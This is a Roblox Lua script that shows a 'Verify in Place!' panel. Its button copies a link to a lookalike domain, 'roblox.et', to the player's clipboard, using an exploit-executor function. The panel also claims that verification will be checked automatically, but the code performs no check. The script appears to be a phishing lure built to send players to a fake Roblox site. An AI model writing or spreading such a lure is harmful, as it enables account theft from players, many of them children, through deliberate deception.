local GUI = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local Button = Instance.new("TextButton")
local SmallText = Instance.new("TextLabel")
local UIGradient = Instance.new("UIGradient")
local UICornerFrame = Instance.new("UICorner")
local UICornerButton = Instance.new("UICorner")

GUI.Name = "GUI"
GUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
GUI.ResetOnSpawn = false

Frame.Name = "Frame"
Frame.Parent = GUI
Frame.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
Frame.Position = UDim2.new(0.35, 0, 0.3, 0)
Frame.Size = UDim2.new(0.3, 0, 0.3, 0)
Frame.Active = true
Frame.ClipsDescendants = true
Frame.BorderSizePixel = 0

UICornerFrame.CornerRadius = UDim.new(0.1, 0)
UICornerFrame.Parent = Frame

-- Градиентный фон
UIGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 40)), 
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 20))
}
UIGradient.Rotation = 90
UIGradient.Parent = Frame

TextLabel.Name = "Title"
TextLabel.Parent = Frame
TextLabel.BackgroundTransparency = 1
TextLabel.Size = UDim2.new(1, 0, 0.25, 0)
TextLabel.Font = Enum.Font.GothamBold
TextLabel.Text = "Verify in Place!"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true

Button.Name = "CopyButton"
Button.Parent = Frame
Button.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
Button.Position = UDim2.new(0.15, 0, 0.4, 0)
Button.Size = UDim2.new(0.7, 0, 0.25, 0)
Button.Font = Enum.Font.GothamBold
Button.Text = "Click to copy!"
Button.TextColor3 = Color3.fromRGB(255, 255, 255)
Button.TextScaled = true

UICornerButton.CornerRadius = UDim.new(0.5, 0)
UICornerButton.Parent = Button

Button.MouseButton1Click:Connect(function()
    setclipboard("https://roblox.et/share?code=f4d9f8208710d50bb5acb5cd10595e0f&type=Server")
    Button.Text = "SUCCESS!"
    Button.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    Button.Active = false
    Button.AutoButtonColor = false
end)

SmallText.Name = "Info"
SmallText.Parent = Frame
SmallText.BackgroundTransparency = 1
SmallText.Position = UDim2.new(0, 0, 0.75, 0)
SmallText.Size = UDim2.new(1, 0, 0.2, 0)
SmallText.Font = Enum.Font.Gotham
SmallText.Text = "Script will check verification automatically!"
SmallText.TextColor3 = Color3.fromRGB(180, 180, 180)
SmallText.TextScaled = true
SmallText.TextWrapped = true
